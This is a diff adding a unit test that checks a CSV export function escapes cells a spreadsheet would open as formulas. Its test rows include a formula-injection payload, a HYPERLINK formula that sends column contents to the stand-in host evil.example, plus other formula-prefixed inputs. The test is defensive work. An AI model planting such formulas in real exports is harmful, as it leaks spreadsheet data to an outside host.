@@ -35,4 +35,32 @@ describe('exportToCsv', () => {
       ['Name,Message,Labels', 'Plain,"Say ""hi""",solo', '"Smith, Jo","first line\nsecond line","bug, ui"'].join('\n'),
     );
   });
+
+  it('must not export a cell that a spreadsheet opens as a formula', async () => {
+    const columns = [
+      { key: 'name', name: 'Name' },
+      { key: 'message', name: 'Message' },
+    ];
+    const rows = [
+      { name: 'Ann', message: '=HYPERLINK("https://evil.example/?"&TEXTJOIN(",",1,C:C),"open")' },
+      { name: '+1+1', message: '-1+1' },
+      { name: '@SUM(A1:A2)', message: '\t=1+1' },
+      { name: 'Bo', message: '\r=1+1' },
+      // A number, a plain name and a missing value are written as they are
+      { name: 'Jo Smith', message: -3 },
+      { name: 'Cy' },
+    ];
+
+    expect(await csvText(columns, rows)).toBe(
+      [
+        'Name,Message',
+        `Ann,"'=HYPERLINK(""https://evil.example/?""&TEXTJOIN("","",1,C:C),""open"")"`,
+        "'+1+1,'-1+1",
+        "'@SUM(A1:A2),'\t=1+1",
+        `Bo,"'\r=1+1"`,
+        'Jo Smith,-3',
+        'Cy,-',
+      ].join('\n'),
+    );
+  });
 });
